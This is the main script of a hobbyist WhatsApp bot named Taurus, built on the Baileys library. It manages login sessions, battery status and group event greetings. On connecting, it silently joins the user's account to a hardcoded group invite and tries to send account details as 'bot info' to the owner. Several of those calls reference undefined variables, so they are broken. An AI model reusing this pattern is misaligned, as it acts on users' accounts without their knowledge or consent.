

const {
WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
   device,
   Browser
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const fs = require("fs-extra")
const figlet = require('figlet')
const clc = require('chalk')
const { sleep, start, success } = require('./lib/myfunc')
const { uncache, nocache } = require('./lib/loader')
const setting = JSON.parse(fs.readFileSync('./setting.json'))
const welcome = require('./message/group')
const fetch = require("node-fetch");
const { getBuffer } = require('./lib/myfunc')
baterai = 'unknown'
charging = 'unknown'


require('./TRS.js')
nocache('../TRS.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
require('./message/help.js')
nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
         
    const starts = async (bosco = new WAConnection()) => {
	bosco.logger.level = 'warn'
	console.log(color(figlet.textSync('TAURUS', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'yellow'))
	console.log(color('[TAURUS]', 'cyan'), color('WELCOME DUDE', 'white'))
	console.log(color('[BOT]', 'cyan'), color('BOT STARTED RUNNING', 'yellow'))
	bosco.browserDescription = ["SUBSCRIBE YT - [TAURUSEDITS]", "firefox", "3.0.0"];

	// Menunggu QR
	bosco.on('qr', () => {
		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Please scan qr code'))
	})

	// Menghubungkan
	fs.existsSync(`./Taurus.json`) && bosco.loadAuthInfo(`./Taurus.json`)
	bosco.on('connecting', () => {
		start('2', 'ᴄʜᴇᴄᴋɪɴɢ ɴᴇᴛᴡᴏʀᴋ...','red')
	})

	//connect
	bosco.on('open', () => {
		success('2', 'ᴄʜᴇᴄᴋɪɴɢ ᴛᴀᴜʀᴜs.ᴊsᴏɴ')
	})

	// session
	await bosco.connect({
		timeoutMs: 10 * 1000
	})
	fs.writeFileSync(`./Taurus.json`, JSON.stringify(bosco.base64EncodedAuthInfo(), null, '\t'));
 teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
 bosco.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ᴛᴀᴜʀᴜs.ᴊsᴏɴ.', 'blue'))
 client.sendMessage("0@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Taurus Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./taurus.jpg'),sourceUrl:"https://wa.me/918157849715?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ.', 'blue'))
client.sendMessage(`0@s.whatsapp.net`, `*ʜɪ ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴛᴀᴜʀᴜs ʙᴏᴛ,\n\nᴛʜᴇ ʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴜᴄᴄᴇsғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*ɪғ ᴛʜᴇʀᴇ ɪs ᴀɴ ᴇʀʀᴏʀ/ʙᴏᴛ ʙᴏᴛ ɴᴏᴛ ʀᴇsᴘᴏɴᴅɪɴɢ,\n\nᴘʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴠᴇʟᴇᴘᴏʀ ʙʏ ᴄʟɪᴄᴋɪɴɢ ᴏɴ ᴛᴀᴜʀᴜs ʟᴏɢᴏ,\n\nᴛʜᴀɴᴋ ʏᴏᴜ*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Taurus Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/918157849715?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('sᴇɴᴅɪɴɢ ʙᴏᴛ ɪɴғᴏ ᴛᴏ ʙᴏᴛ ᴏᴡɴᴇʀ', 'cyan'))
	
	// Baterai
	bosco.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
		console.log(json[2][0][1])
		console.log('Battery : ' + batterylevel + '%')
	})
	global.batrei = global.batrei ? global.batrei : []
	bosco.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	})
	
	  // Call Block
	/*bosco.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        console.log("caller "+ callerId)
        bosco.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
        await sleep(3000)
        await bosco.blockUser(callerId, "add") // Block user
   })*/
   
   bosco.on('message-delete', async (m) => {
   	await m(m)
   })
  
       // welcome
	bosco.on('group-participants-update', async (anu) => {
		await welcome(bosco, anu)
		try { 
           const mdata = await bosco.groupMetadata(anu.jid)
           console.log(anu)
		if (anu.action == 'promote'){
			num = anu.participants[0]
			try {
					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			const bosco1 = await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
			const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
			teks = `*Yᴏᴜ Aʀᴇ Nᴏᴡ Aɴ Aᴅᴍɪɴ*
 @${num.split('@')[0]}
`
			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
            promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
            bosco.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
		    } else if (anu.action == 'demote') {
			num = anu.participants[0]
			const mdata = await bosco.groupMetadata(anu.jid)
			try {
					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let buff = await getBuffer(ppimg)
			const bosco3= await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
			const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
			teks = `*Yᴏᴜ Aʀᴇ Nᴏ Lᴏɴɢᴇʀ Aɴ Aᴅᴍɪɴ*
 @${num.split('@')[0]}
`
			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
            demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
            bosco.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
		    }
            } catch (e) {
         console.log('Error : %s', color(e, 'red'))
      }
})

    bosco.on('group-update', async (anu) => {
    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
   remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "120363042182512544@g.us","inviteCode": "mememteeeekkeke","groupName": "Alphabot", "caption": `🦋 𝐓 𝐀 𝐔 𝐑 𝐔 𝐒 🦋 `, 'jpegThumbnail': fs.readFileSync(`ds.jpg`)}}}
    metdata = await bosco.groupMetadata(anu.jid)
    if(anu.announce == 'false'){
    teks = `*[ Gʀᴏᴜᴘ Oᴘᴇɴᴇᴅ ]*\n`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
  } else if(anu.announce == 'true'){
    teks = `*[ Gʀᴏᴜᴘ Cʟᴏsᴇᴅ ]*\n`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
  } else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `*[ Gʀᴏᴜᴘ Dɪsᴄʀɪᴘᴛɪᴏɴ Cʜᴀɴɢᴇ ]*\n\n • *ɴᴇᴡ* : *${anu.desc}*`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
    console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
 } else if(anu.restrict == 'false'){
    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢs Cʜᴀɴɢᴇ ]*\n`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
  } else if(anu.restrict == 'true'){
    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢ Cʜᴀɴɢᴇ ]*\n`
    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
   }
})

    
	bosco.on('chat-update', async (message) => {
		require('./TRS.js')(bosco, message)
	})
}

starts()
